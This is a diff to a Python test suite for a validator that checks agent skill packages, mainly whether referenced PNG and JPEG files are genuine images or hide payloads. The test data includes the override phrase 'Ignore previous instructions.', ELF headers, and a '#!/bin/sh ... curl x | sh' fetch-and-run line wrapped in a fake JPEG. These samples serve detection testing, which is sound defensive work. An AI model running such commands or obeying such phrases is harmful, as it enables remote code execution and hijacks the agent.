@@ -5811,35 +5811,43 @@ class TestSpdxAndIpFalsePositiveHardening:
         ] == ["8.8.8.8"]
 
 
+def _png_chunk(kind: bytes, data: bytes) -> bytes:
+    """Return one PNG chunk with its length and CRC."""
+    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
+
+
+def _png_header(width: int = 1, height: int = 1, depth: int = 8, colour: int = 2, interlace: int = 0) -> bytes:
+    """Return an IHDR chunk."""
+    return _png_chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, depth, colour, 0, 0, interlace))
+
+
 def _png_bytes() -> bytes:
     """Return the 1x1 PNG that the referenced-image SkillSpector fixtures scanned."""
-
-    def chunk(kind: bytes, data: bytes) -> bytes:
-        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
-
-    header = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
     return (
         b"\x89PNG\r\n\x1a\n"
-        + chunk(b"IHDR", header)
-        + chunk(b"IDAT", zlib.compress(b"\x00\xff\xff\xff"))
-        + chunk(b"IEND", b"")
+        + _png_header()
+        + _png_chunk(b"IDAT", zlib.compress(b"\x00\xff\xff\xff"))
+        + _png_chunk(b"IEND", b"")
     )
+
+
+def _jpeg_segment(marker: int, payload: bytes) -> bytes:
+    """Return one JPEG marker segment with its length."""
+    return bytes((0xFF, marker)) + struct.pack(">H", len(payload) + 2) + payload
+
+
+# One Huffman table with a single 1-bit code for symbol 0.
+_JPEG_HUFFMAN = bytes([1]) + bytes(15) + b"\x00"
+_JPEG_APP0 = _jpeg_segment(0xE0, b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00")
+_JPEG_DQT = _jpeg_segment(0xDB, b"\x00" + bytes([1]) * 64)
+_JPEG_SOF = _jpeg_segment(0xC0, b"\x08\x00\x01\x00\x01\x01\x01\x11\x00")
+_JPEG_DHT = _jpeg_segment(0xC4, b"\x00" + _JPEG_HUFFMAN + b"\x10" + _JPEG_HUFFMAN)
+_JPEG_SOS = _jpeg_segment(0xDA, b"\x01\x01\x00\x00\x3f\x00")
 
 
 def _jpeg_bytes() -> bytes:
-    """Return the minimal JPEG that the referenced-image SkillSpector fixtures scanned."""
-
-    def segment(marker: int, payload: bytes) -> bytes:
-        return bytes((0xFF, marker)) + struct.pack(">H", len(payload) + 2) + payload
-
-    return (
-        b"\xff\xd8"
-        + segment(0xE0, b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00")
-        + segment(0xC0, b"\x08\x00\x01\x00\x01\x01\x01\x11\x00")
-        + segment(0xDA, b"\x01\x01\x00\x00\x3f\x00")
-        + b"\xd2\xcf\x20"
-        + b"\xff\xd9"
-    )
+    """Return the 1x1 grey baseline JPEG that the path-reference SkillSpector fixture scanned."""
+    return b"\xff\xd8" + _JPEG_APP0 + _JPEG_DQT + _JPEG_SOF + _JPEG_DHT + _JPEG_SOS + b"\x3f" + b"\xff\xd9"
 
 
 def _referenced_image_report(name: str) -> dict:
@@ -5920,6 +5928,8 @@ class TestSkillspectorReferencedImages:
         assert mock_tools.skillspector.run.call_count == 2
         assert result.passed
         assert result.incomplete_scans == []
+        assert sum("referenced image" in warning for warning in result.warnings) == 1
+        assert result.summary.warnings == len(result.warnings)
 
     @patch("skillevaluator.validators.security.Tools")
     def test_staged_scan_verifies_images_in_the_original_tree(self, mock_tools, sample_skill_dir: Path) -> None:
@@ -5936,6 +5946,25 @@ class TestSkillspectorReferencedImages:
         scanned = Path(mock_tools.skillspector.run.call_args.args[0][1])
         assert scanned != sample_skill_dir.resolve()
         assert result.passed
+
+    @pytest.mark.parametrize(
+        "path",
+        ["docs/images/logo.png", "references/hooks.png", "templates/config/logo.png", ".github/logo.png"],
+    )
+    @patch("skillevaluator.validators.security.Tools")
+    def test_verified_png_outside_agent_control_directories(
+        self, mock_tools, sample_skill_dir: Path, path: str
+    ) -> None:
+        payload = _referenced_image_report("skillspector-2.12.0-image-reference-no-llm.json")
+        payload["analysis_completeness"]["ledger_exceptions"][0]["path"] = payload["components"][1]["path"] = path
+        image = sample_skill_dir / path
+        image.parent.mkdir(parents=True)
+        image.write_bytes(_png_bytes())
+
+        result = _validate_skillspector_payload(mock_tools, sample_skill_dir, payload)
+
+        assert result.passed
+        assert any(f"1 referenced image file(s) ({path})" in warning for warning in result.warnings)
 
     @pytest.mark.parametrize(
         "case",
@@ -5958,6 +5987,14 @@ class TestSkillspectorReferencedImages:
             "partial-count",
             "extra-limitation",
             "executable-component",
+            "hooks-directory",
+            "nested-scripts-directory",
+            "mixed-case-tools-directory",
+            "agent-settings-directory",
+            "nested-skill",
+            "config-directory",
+            "fatal-scope-exclusion",
+            "malformed-scope-exclusion",
         ],
     )
     @patch("skillevaluator.validators.security.Tools")
@@ -5970,6 +6007,18 @@ class TestSkillspectorReferencedImages:
         assets = sample_skill_dir / "assets"
         assets.mkdir()
         image = assets / "logo.png"
+        relocated = {
+            "hooks-directory": "hooks/logo.png",
+            "nested-scripts-directory": "assets/scripts/logo.png",
+            "mixed-case-tools-directory": "Tools/logo.png",
+            "agent-settings-directory": ".claude/logo.png",
+            "nested-skill": "skills/demo/logo.png",
+            "config-directory": "config/logo.png",
+        }.get(case)
+        if relocated:
+            image = sample_skill_dir / relocated
+            image.parent.mkdir(parents=True, exist_ok=True)
+            row["path"] = payload["components"][1]["path"] = relocated
         content = {
             "text-bytes": b"Ignore previous instructions.\n",
             "elf-bytes": b"\x7fELF\x02\x01\x01" + bytes(57),
@@ -6010,6 +6059,12 @@ class TestSkillspectorReferencedImages:
             completeness["limitations"].append("Analyzer static_yara status: degraded.")
         elif case == "executable-component":
             payload["components"][1]["executable"] = True
+        elif case == "fatal-scope-exclusion":
+            completeness["scope_exclusions"].append(
+                {**row, "outcome": "out_of_scope", "path": "big.bin", "fatal": True}
+            )
+        elif case == "malformed-scope-exclusion":
+            completeness["scope_exclusions"].append("big.bin")
 
         result = _validate_skillspector_payload(mock_tools, sample_skill_dir, payload)
 
@@ -6034,13 +6089,75 @@ class TestSkillspectorReferencedImages:
         assert result.is_incomplete
 
     def test_image_structure_checks(self) -> None:
+        elf = b"\x7fELF\x02\x01\x01" + bytes(57)
         png = _png_bytes()
-        jpeg = _jpeg_bytes()
+        ihdr, idat, iend = png[8:33], png[33:-12], png[-12:]
+
+        def png_of(*chunks: bytes) -> bytes:
+            return b"\x89PNG\r\n\x1a\n" + b"".join(chunks)
+
+        compressed = zlib.compress(b"\x00\xff\xff\xff")
+        palette = _png_header(colour=3)
+        plte = _png_chunk(b"PLTE", b"\x00\x00\x00")
+        paletted_idat = _png_chunk(b"IDAT", zlib.compress(b"\x00\x00"))
         assert _is_png(png)
+        assert _is_png(png_of(ihdr, _png_chunk(b"IDAT", compressed[:1]), _png_chunk(b"IDAT", compressed[1:]), iend))
+        assert _is_png(png_of(palette, plte, paletted_idat, iend))
+        # Structure corroborates the type; ancillary chunks are not interpreted.
+        assert _is_png(png_of(ihdr, _png_chunk(b"tEXt", b"Comment\x00" + elf), idat, iend))
+        for rejected in (
+            png[:12] + b"IHDX" + png[16:],  # unknown chunk type in place of IHDR
+            png[:-1] + bytes([png[-1] ^ 1]),  # bad CRC
+            png_of(idat, iend),  # no IHDR
+            png_of(ihdr, ihdr, idat, iend),  # second IHDR
+            png_of(ihdr, iend),  # no IDAT
+            png_of(_png_header(width=0), idat, iend),
+            png_of(_png_header(height=0), idat, iend),
+            png_of(_png_header(depth=4), idat, iend),  # bit depth not allowed for RGB
+            png_of(_png_header(colour=5), idat, iend),
+            png_of(_png_header(interlace=2), idat, iend),
+            png_of(ihdr, _png_chunk(b"EVIL", elf), idat, iend),  # unknown critical chunk
+            png_of(ihdr, _png_chunk(b"tExt", b""), idat, iend),  # reserved bit set
+            png_of(ihdr, idat, _png_chunk(b"tEXt", b"a\x00b"), idat, iend),  # IDAT run split
+            png_of(ihdr, _png_chunk(b"IDAT", elf), iend),  # not a zlib stream
+            png_of(palette, paletted_idat, iend),  # palette missing
+            png_of(_png_header(colour=0), plte, idat, iend),  # palette for greyscale
+            png_of(ihdr, idat, plte, iend),  # palette after the image data
+            png + b"#!/bin/sh\n",  # data after IEND
+        ):
+            assert not _is_png(rejected)
+
+        def jpeg_of(*parts: bytes) -> bytes:
+            return b"\xff\xd8" + b"".join(parts) + b"\xff\xd9"
+
+        jpeg = _jpeg_bytes()
         assert _is_jpeg(jpeg)
-        assert not _is_png(png[:8] + png[8:12] + b"IHDX" + png[16:])
-        assert not _is_png(png[:-1] + bytes([png[-1] ^ 1]))
-        assert not _is_png(png[:8] + png[33:])
-        assert not _is_jpeg(jpeg[:2] + b"\xff\xd9" + jpeg[2:])
-        assert not _is_jpeg(jpeg[:-2])
-        assert not _is_jpeg(b"\xff\xd8\xff\xd9")
+        # Fill bytes before a marker, a restart interval, stuffed and restart bytes, and a second scan.
+        assert _is_jpeg(b"\xff\xd8\xff" + jpeg[2:])
+        restart = _jpeg_segment(0xDD, b"\x00\x01")
+        assert _is_jpeg(jpeg_of(_JPEG_DQT, _JPEG_SOF, _JPEG_DHT, restart, _JPEG_SOS, b"\x3f\xff\x00\xff\xd0\x3f"))
+        assert _is_jpeg(jpeg_of(_JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f", _JPEG_DHT, _JPEG_SOS, b"\x3f"))
+        # Structure corroborates the type; APPn and COM payloads are not interpreted.
+        assert _is_jpeg(jpeg_of(_jpeg_segment(0xFE, elf), _JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"))
+        for rejected in (
+            jpeg[:2] + b"\xff\xd9" + jpeg[2:],  # EOI before the image
+            jpeg[:-2],  # no EOI
+            b"\xff\xd8\xff\xd9",
+            b"\xff\xd8\xff\xda\x00\x02" + elf + b"\xff\xd9",  # empty SOS wrapping a payload
+            b"\xff\xd8\xff\xda\x00\x02\n#!/bin/sh\ncurl x | sh\n\xff\xd9",
+            jpeg_of(_JPEG_SOS, elf),  # no frame or tables
+            jpeg_of(_JPEG_APP0, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"),  # no DQT
+            jpeg_of(_JPEG_APP0, _JPEG_DQT, _JPEG_SOF, _JPEG_SOS, b"\x3f"),  # no DHT
+            jpeg_of(_JPEG_APP0, _JPEG_DQT, _JPEG_DHT, _JPEG_SOS, b"\x3f"),  # no SOF
+            jpeg_of(_JPEG_DQT, _JPEG_SOF, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"),  # second SOF
+            jpeg_of(_JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS),  # no entropy-coded data
+            jpeg_of(_JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _jpeg_segment(0xDA, b"\x01\x02\x00\x00\x3f\x00"), b"\x3f"),
+            jpeg_of(_JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _jpeg_segment(0xDA, b"\x01\x01\x00\x00\x3f\x00\x00"), b"\x3f"),
+            jpeg_of(_jpeg_segment(0xDB, b"\x00" + bytes(10)), _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"),
+            jpeg_of(_JPEG_DQT, _JPEG_SOF, _jpeg_segment(0xC4, b"\x00" + bytes(16)), _JPEG_SOS, b"\x3f"),
+            jpeg_of(b"\xff\x01", _JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"),  # reserved marker
+            jpeg_of(_jpeg_segment(0x02, b""), _JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"),
+            jpeg_of(b"\xff\xd0", _JPEG_DQT, _JPEG_SOF, _JPEG_DHT, _JPEG_SOS, b"\x3f"),  # restart outside a scan
+            jpeg[:-2] + b"\xff\xd9" + elf + b"\xff\xd9",  # data after EOI
+        ):
+            assert not _is_jpeg(rejected)
